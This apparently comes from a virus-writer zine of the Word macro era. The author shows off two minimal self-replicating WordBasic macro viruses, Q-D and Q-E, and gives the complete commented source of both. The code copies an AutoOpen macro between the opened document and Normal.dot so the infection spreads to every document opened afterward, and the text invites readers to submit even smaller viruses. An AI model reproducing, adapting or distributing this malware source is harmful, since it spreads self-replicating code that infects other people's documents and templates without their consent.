
                        The smallest Macro virus!?
                        ~~~~~~~~~~~~~~~~~~~~~~~~~~
This time I have tried to make the smallest macro virus.
Ok, look at the result.

---Here start's the code of the Q-D virus-------------

Sub MAIN

'If any error go to the next command.
'a$ = active file + macro "AutoopeN"

On Error Resume Next : a$=FileName$() + ":AutoopeN"

'b$ = Normal.dot + macro "aUTOOPEn".
'Copy the AutoopeN macro from the active file to Normal.dot.
'If the active file isn't infected go to the next command.

b$="Global:aUTOOPEn" : MacroCopy a$, b$

'Save the active file as a template and
'copy the aUTOOPEn macro from Normal.dot to the active file.

FileSaveAs .Format = 1 : MacroCopy b$, a$

'the code ends here.

End Sub
------------------------------------------------------

So, the size of this virus is now only 101 Bytes and
it can infect every text file. But of course that's not
the smallest macro virus, because if we could make a virus
with 101 Bytes, which can infect every text file we should
can make a smaller virus, which can only infect dot files.
(= Intended)
And here is it:

----The code of the Q-E virus start's here------------

Sub MAIN

'If any error go to the next command and
'a$ = active file + macro "AutoopeN"

On Error Resume Next : a$=FileName$() + ":AutoopeN"

'b$ = Normal.dot + macro "aUTOOPEn". 
'Copy the AutoopeN macro from the active file to normal.dot.
'If the active file isn't infected go to the next command.

b$="Global:aUTOOPEn" : MacroCopy a$, b$

'Copy now the aUTOOPEn macro from Normal.dot to the active file.

MacroCopy b$, a$

'the code ends here.

End Sub
------------------------------------------------------

OK, I think that's the smallest macro virus.
The size is only 90 Bytes. ;-))

If you can make a smaller macro virus, please send it me.
